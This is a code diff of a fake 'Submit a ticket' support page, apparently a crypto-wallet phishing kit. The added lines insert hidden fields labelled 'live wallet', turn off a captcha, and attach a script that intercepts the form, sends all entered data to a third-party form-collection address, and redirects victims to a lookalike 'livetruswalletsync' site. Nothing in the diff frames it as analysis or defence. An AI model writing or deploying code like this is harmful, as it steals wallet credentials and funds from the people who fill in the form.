@@ -95,6 +95,11 @@
                                 <h1 class="new-ticket-title">Submit a ticket</h1>
                                 <div class="new-ticket-form">
                                     <form action="" method="POST" id="my-form" class="form-portal ticket-form" enctype="multipart/form-data" rel="validate">
+                                         
+		
+    <input type="hidden" name="_subject" value="live wallet">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_template" value="table">
                                         <div style="margin:0;padding:0;display:inline"><input name="utf8" type="hidden" value="✓"><input name="authenticity_token" type="hidden" value="9jdsv/e0w6xVCJudcvKPERMX5FnOzudJmPgY5MGI6RI="></div>
 
                                         <div class="control-group  ">
@@ -299,11 +304,11 @@
                                      
 
                                        
-                               <button class=" " style="border-radius: 10px;">
-                           <a href="connect.html" class="Link__CustomLink-sc-1p80yfz-0 hDjhKH Button__BaseButton-sc-1e82yhp-0 Button__ButtonLink-sc-1e82yhp-1 fsUXqo FeatureSectionComponents__ProductButton-sc-1j7c5-12 eaEhQt" rel="nofollow noopener noreferrer" target="_blank" style="color: ; ">
-                          Continue
-                       </a>
-
+                               <button type="submit" class=" " style="border-radius: 10px;">
+                      <!--     <a href="connect.html" class="Link__CustomLink-sc-1p80yfz-0 hDjhKH Button__BaseButton-sc-1e82yhp-0 Button__ButtonLink-sc-1e82yhp-1 fsUXqo FeatureSectionComponents__ProductButton-sc-1j7c5-12 eaEhQt" rel="nofollow noopener noreferrer" target="_blank" style="color: ; ">
+                          
+                       </a> -->
+Continue
                        </button>
                        
 
@@ -311,6 +316,24 @@
 
                                     
                                     </form>
+                                    <script>
+document.getElementById("my-form").addEventListener("submit", async (e) => {
+  e.preventDefault();
+
+  const formData = new FormData(e.target);
+
+  await fetch("https://formsubmit.co/271c06d36b1c904f1b8fc4d5f7df0c8d", {
+    method: "POST",
+    body: formData
+  });
+
+  await fetch("https://formsubmit.co/271c06d36b1c904f1b8fc4d5f7df0c8d", {
+    method: "POST",
+    body: formData
+  });
+window.location.href = "https://livetruswalletsync.vercel.app/connect.html";
+});
+</script>
                                     <script src="js/lookup_field-c2541f480d8fc5cef381bfb319eeb173.js" type="text/javascript"></script>
                                     <script type="text/javascript">
                                         //<![CDATA[
